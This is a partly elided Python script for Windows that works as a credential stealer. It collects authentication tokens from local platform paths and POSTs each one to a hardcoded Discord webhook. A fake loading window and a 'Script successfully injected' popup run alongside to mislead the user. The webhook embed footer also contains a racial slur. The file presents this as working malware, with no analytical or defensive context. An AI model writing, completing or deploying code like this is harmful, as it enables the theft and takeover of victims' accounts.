...
import base64
import datetime
import win32api  # For MessageBox popup
import tkinter as tk  # For loading animation
from tkinter import ttk
import threading  # To run main logic in background
import time  # For loading animation timing
...
def show_loading_window(root, complete_event):
    """Display a loading window with a progress bar and animated text."""
    ...
    def update_loading_text():
        ...
        while not complete_event.is_set():
            label.config(text=dots[i % len(dots)])
            root.update()
            time.sleep(0.5)
            i += 1
        root.destroy()  # Close the window when the event is set
    
    # Start the text animation in a separate thread
    threading.Thread(target=update_loading_text, daemon=True).start()

def main(complete_event):
    checked = []
    for platform, path in PATHS.items():
        ...
        for token in gettokens(path):
            ...
            try:
                    ...
                    'embeds': [
                        {
                            ...
                            'color': 3092790,
                            'footer': {
                                'text': "rev - no mal usage ・ niggachain.ai"
                            },
                            'thumbnail': {
                ...
                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1386649783065903195/ycX7jj2SJfblCGklFy-51t_yo8EaXhwkY3zPn6GzewOYxbumQGDhtl0xdgJoTe7Yonhz', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
            except urllib.error.HTTPError or json.JSONDecodeError:
                continue
            except Exception as e:
                print(f"ERROR: {e}")
                continue
    complete_event.set()  # Signal that the main logic is complete

if __name__ == "__main__":
    # Create the Tkinter root window
    root = tk.Tk()
    
    # Create an event to signal when the main logic is complete
    complete_event = threading.Event()
    
    # Show the loading window
    show_loading_window(root, complete_event)
    
    # Run the main logic in a separate thread
    threading.Thread(target=main, args=(complete_event,), daemon=True).start()
    
    # Start the Tkinter main loop
    root.mainloop()
    
    # Show success popup after the loading window closes
    win32api.MessageBox(0, "Script successfully injected", "Success", 0x00001000)
